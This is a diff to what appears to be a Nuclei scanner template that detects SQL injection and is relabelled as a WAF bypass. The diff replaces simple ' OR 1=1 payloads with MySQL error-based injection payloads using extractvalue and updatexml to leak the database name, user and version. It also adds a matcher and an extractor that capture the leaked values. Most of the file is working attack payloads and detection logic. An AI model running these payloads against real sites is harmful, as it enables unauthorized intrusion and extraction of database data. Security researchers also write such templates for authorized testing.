@@ -1,7 +1,7 @@
-id: nawab-confirmed-sqli
+id: Nawab_Sqli
 
 info:
-  name: ⚡ Nawab-Confirmed-SQLi ⚡
+  name: Nawab-Validated-SQLi-WAF-Bypass
   author: thenawabx
   severity: critical
 
@@ -12,11 +12,10 @@ http:
 
     payloads:
       sqli_payloads:
-        - "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)--"
-        - "' OR 1=1 --"
-        - "%27%20OR%201%3D1%20--"
-        - "') OR 1=1--"
-        - "\"' OR 1=1--"
+        - "1' AND (extractvalue(1,concat(0x7e,(SELECT database()),0x7e)))--"
+        - "1\" AND (extractvalue(1,concat(0x7e,(SELECT user()),0x7e)))--"
+        - "1' AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1))--"
+        - "1' AND 1=(SELECT 1 FROM (SELECT(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))))x)--"
 
     fuzzing:
       - part: query
@@ -24,31 +23,21 @@ http:
         fuzz:
           - "{{sqli_payloads}}"
 
-    matchers-condition: or
+    matchers-condition: and
     matchers:
       - type: regex
-        name: database-version
         part: body
         regex:
-          - "~[0-9]+\\.[0-9]+\\.[a-zA-Z0-9-~]+"
+          - "XPATH syntax error: '~[a-zA-Z0-9_\\-]+~'"
 
-      - type: word
-        name: login-success-indicators
-        words:
-          - "dashboard"
-          - "profile"
-          - "logout"
-          - "welcome"
-        part: body
-        condition: or
+      - type: status
+        status:
+          - 200
+          - 500
 
-      - type: word
-        name: sql-error-strings
-        words:
-          - "SQL syntax"
-          - "mysql_fetch_array"
-          - "ORA-00933"
-          - "PostgreSQL query failed"
-          - "SQLite3::query"
+    extractors:
+      - type: regex
+        name: FOUND_SQLI_EXPOSED_DATA
         part: body
-        condition: or
+        regex:
+          - "~[a-zA-Z0-9_\\-]+~"
